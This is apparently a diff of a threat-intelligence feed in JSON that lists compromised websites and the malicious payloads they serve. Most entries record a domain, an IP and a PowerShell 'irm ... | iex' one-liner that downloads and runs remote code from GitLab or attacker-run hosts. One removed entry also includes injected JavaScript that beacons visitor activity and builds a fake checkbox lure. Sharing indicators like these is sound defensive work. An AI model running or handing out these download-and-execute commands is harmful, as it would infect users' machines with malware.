@@ -1,5 +1,198 @@
 [
   {
+    "UrlDomain": "estilumocr.mochileroscostarica.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "173.254.31.164"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/cc4b6f224188/4495be-a229-4a88-ab68-d0b50dfe86b4/-/raw/main/E53-a76F-3c3D6f99 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/cc4b6f224188/4495be-a229-4a88-ab68-d0b50dfe86b4/-/raw/main/E53-a76F-3c3D6f99"
+    ],
+    "ReportId": "cmwkwos8m1gkp0omlt4yakzjb",
+    "ScannedAt": "2026-11-17T16:27:52.213000+00:00"
+  },
+  {
+    "UrlDomain": "intelligentoverseaseducation.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/55bbcc0972a7f52e"
+    ],
+    "IP": [
+      "162.210.96.116"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/55bbcc0972a7f52e')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/55bbcc0972a7f52e"
+    ],
+    "ReportId": "cmwkwogiy1gj50oml7s1qykid",
+    "ScannedAt": "2026-11-17T16:27:36.918000+00:00"
+  },
+  {
+    "UrlDomain": "keyportwarehousing.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/caf5b9a1f5f14017",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=6d61d3c4f0ecf193c89fbb37ccc86999b416c0289e00584d&amp;_v=29915546",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/caf5b9a1f5f14017'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/caf5b9a1f5f14017"
+    ],
+    "ReportId": "cmwkwnzbj1gia0oml0nx35ejg",
+    "ScannedAt": "2026-11-17T16:27:14.726000+00:00"
+  },
+  {
+    "UrlDomain": "airbedcomparisons.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/10e3132beb43e46a"
+    ],
+    "IP": [
+      "51.222.173.72"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/10e3132beb43e46a')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/10e3132beb43e46a"
+    ],
+    "ReportId": "cmwkwncld1gh40omlgi2ci092",
+    "ScannedAt": "2026-11-17T16:26:45.262000+00:00"
+  },
+  {
+    "UrlDomain": "articlelab.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/96f5354b102ae253"
+    ],
+    "IP": [
+      "54.39.199.227"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/96f5354b102ae253')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/96f5354b102ae253"
+    ],
+    "ReportId": "cmwkwna3t1ggu0omlkh46m4jy",
+    "ScannedAt": "2026-11-17T16:26:42.080000+00:00"
+  },
+  {
+    "UrlDomain": "vybetelecom.in",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "68.178.151.63"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwkw78tg1ger0omll3675aoe",
+    "ScannedAt": "2026-11-17T16:14:13.898000+00:00"
+  },
+  {
+    "UrlDomain": "www.techtitanprep.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "67.205.7.188"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwkvr0wy1gbq0oml11odrf3k",
+    "ScannedAt": "2026-11-17T16:01:37.123000+00:00"
+  },
+  {
+    "UrlDomain": "vermonttechnologies.co.in",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.211.86.20"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwkvpzsj1g9w0omldxy4pqzo",
+    "ScannedAt": "2026-11-17T16:00:49.068000+00:00"
+  },
+  {
+    "UrlDomain": "omansharingtours.com",
+    "DeliveryUrl": [
+      "tripadvisor.com"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "173.233.70.114"
+    ],
+    "Related": [
+      {
+        "Value": "https://www.tripadvisor.com/widgetembed-selfserveprop?border=true&amp;popidx=true&amp;iswide=true&amp;locationid=21402738&amp;display_version=2&amp;uniq=676&amp;rating=true&amp;lang=en_us&amp;nreviews=4&amp;writereviewlink=true",
+        "Type": "Reference"
+      },
+      {
+        "Value": "www.tripadvisor.com",
+        "Type": "Hostname"
+      },
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwkvpwlq1g8i0omlnx9yaren",
+    "ScannedAt": "2026-11-17T16:00:44.927000+00:00"
+  },
+  {
     "UrlDomain": "maverick-petro.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -7733,101 +7926,5 @@
     ],
     "ReportId": "cmwccx3dt078o0omlivx66n50",
     "ScannedAt": "2026-11-11T16:52:18.178000+00:00"
-  },
-  {
-    "UrlDomain": "sevox.net",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "207.174.214.171"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
-    ],
-    "ReportId": "cmwcc66iw07310omlt924pkt8",
-    "ScannedAt": "2026-11-11T16:31:22.552000+00:00"
-  },
-  {
-    "UrlDomain": "hydebuild.com.au",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "27.123.26.225"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
-    ],
-    "ReportId": "cmwcc4tsn071c0omltwru33xb",
-    "ScannedAt": "2026-11-11T16:30:19.360000+00:00"
-  },
-  {
-    "UrlDomain": "bgrsportzz.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "66.116.209.33"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/408a-b9d3-72909d12f8e6/-/raw/main/5b8-f0f1d6cc1e65"
-    ],
-    "ReportId": "cmwcbl5u006vv0omlb42loz7x",
-    "ScannedAt": "2026-11-11T16:15:01.776000+00:00"
-  },
-  {
-    "UrlDomain": "brightedu.vn",
-    "DeliveryUrl": [
-      "content-collector.com",
-      "js-staticdelivery.com",
-      "document.head.appendchild"
-    ],
-    "PayloadUrl": [
-      "https://content-collector.com/dyjjs2ggewlxgmke",
-      "https://js-staticdelivery.com"
-    ],
-    "IP": [
-      "103.57.223.36"
-    ],
-    "Related": [
-      {
-        "Value": "https://js-staticdelivery.com/e.js?_=1794413201775",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://js-staticdelivery.com/api/js/beacon/8008b4f134704bdd?event=visit&amp;note=&amp;page=https%3a%2f%2fbrightedu.vn%2f&amp;ref=&amp;_=1794413203964",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://js-staticdelivery.com/api/js/beacon/8008b4f134704bdd?event=click&amp;note=&amp;page=https%3a%2f%2fbrightedu.vn%2f&amp;ref=&amp;_=1794413207817",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "powershell -c \\\"irm 'https://content-collector[.]com/dYjJs2gGewlXGMKe'|powershell -\\\"\"; (function(){var C=\"8008b4f134704bdd\",B=\"https://js-staticdelivery[.]com\";var FS=0,HC=0,OBF=1,AFTER=\"close\",REDIR=\"\";function _pg(){try{return{page:location.href||\"\",ref:document.referrer||\"\"};}catch(e){return{page:\"\",ref:\"\"};}}function pb(ev,nt){try{var pg=_pg();var u=B+\"/api/js/beacon/\"+encodeURIComponent(C)+\"?event=\"+encodeURIComponent(ev)+\"&note=\"+encodeURIComponent(nt||\"\")+\"&page=\"+encodeURIComponent(pg[.]page)+\"&ref=\"+encodeURIComponent(pg.ref)+\"&_=\"+Date.now();var s=document.createElement(\"script\");s.src=u;s.async=true;document.head.appendChild(s);}catch(e){}}window.__panelBeacon=pb;function _capClick(t){if(!t)return false;if(t.id===\"cfm-cb\"||t.id===\"cfm-ck\")return true;if(t.closest&&(t.closest(\"#cfm-cb\")||t.closest(\"#cfm-ck\")||t.closest(\".checkbox-window\")||t.closest(\".checkbox-container\")))return true;return false;}function _rid(n){var c='abcdefghijklmnopqrstuvwxyz0123456789',s='';for(var i=0;i",
-    "ResolvedDownloadUrl": [
-      "https://content-collector.com/dYjJs2gGewlXGMKe",
-      "https://js-staticdelivery.com"
-    ],
-    "ReportId": "cmwcbb1wp06p00omllkagp0ih",
-    "ScannedAt": "2026-11-11T16:07:10.237000+00:00"
   }
 ]
